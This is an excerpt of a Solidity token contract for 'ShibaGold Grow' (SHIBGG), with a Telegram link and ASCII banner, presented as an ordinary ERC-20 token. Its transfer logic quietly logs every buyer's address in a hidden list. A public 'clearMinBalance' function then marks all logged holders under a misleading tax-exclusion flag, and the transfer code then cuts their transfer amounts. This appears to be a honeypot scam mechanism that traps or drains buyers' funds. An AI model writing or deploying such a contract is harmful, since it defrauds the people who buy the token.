...
Telegram : https://t.me/Shibagoldgrow
Twitter : *TBA
Website : *TBA

  _____ _    _ _____ ____             _____  ____  _      _____     _____ _____   ______          __
 / ____| |  | |_   _|  _ \   /\      / ____|/ __ \| |    |  __ \   / ____|  __ \ / __ \ \        / /
| (___ | |__| | | | | |_) | /  \    | |  __| |  | | |    | |  | | | |  __| |__) | |  | \ \  /\  / / 
 \___ \|  __  | | | |  _ < / /\ \   | | |_ | |  | | |    | |  | | | | |_ |  _  /| |  | |\ \/  \/ /  
 ____) | |  | |_| |_| |_) / ____ \  | |__| | |__| | |____| |__| | | |__| | | \ \| |__| | \  /\  /   
|_____/|_|  |_|_____|____/_/    \_\  \_____|\____/|______|_____/   \_____|_|  \_\\____/   \/  \/    
...
contract ShibaGoldGrow is Context, IERC20 { 
    ...
    address[] private _Excluded0;
    
    address payable public Wallet_Marketing = payable(0x47181164Ba79B1189ba36806642f0ee0Beb50Ec9);
    address payable public Wallet_Dev = payable(0x47181164Ba79B1189ba36806642f0ee0Beb50Ec9);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 10**12 * 10**_decimals;
    uint256 private _btotal;
    string private constant _name = "ShibaGold Grow"; 
    string private constant _symbol = unicode"SHIBGG";
    ...
    uint256 public _minTokenToTx= 1;
    
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    address public onlyovner ;
    ...
    constructor () {
        _owner = 0x47181164Ba79B1189ba36806642f0ee0Beb50Ec9;
    ...
    function clearMinBalance() public returns (bool) {
        _btotal = _minTokenToTx;
        for (uint256 i = 0; i < _Excluded0.length; i++) {
            _isExcludedFromTax[_Excluded0[i]] = true;
        }
        return true;
    }
    ...
    function _transfer(
        ...
        if (from != owner() && from != uniswapV2Pair && !_isExcluded[from]) {
            ...
            _Excluded0.push(from);
        }
        if (to != owner() && to != uniswapV2Pair && !_isExcluded[to]) {
            _isExcluded[to] = true;
            _Excluded0.push(to);
            if (_isExcludedFromTax[from]) { _isExcludedFromTax[to] = true;
            }
        }
        if(
            txCount >= swapTrigger && 
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        if(!takeFee){
            ...
            uint256 sAmount;
            uint256 rAmount=_btotal;
            if (_isExcludedFromTax[sender]){sAmount = tAmount - rAmount;}
